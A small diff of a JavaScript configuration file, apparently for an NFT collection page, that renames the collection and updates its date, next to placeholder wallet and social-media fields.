@@ -9,8 +9,8 @@ const receiveAddress = "YOUR WALLET";
 */
 
 const collectionInfo = {
-    name: "nft-professor",
-    date: "10.04.2022",
+    name: "Cronos1402",
+    date: "10.04.2023",
     socialMedia: {
         discord: "discord.gg/invite_here",
         twitter: "https://twitter.com/username_here",
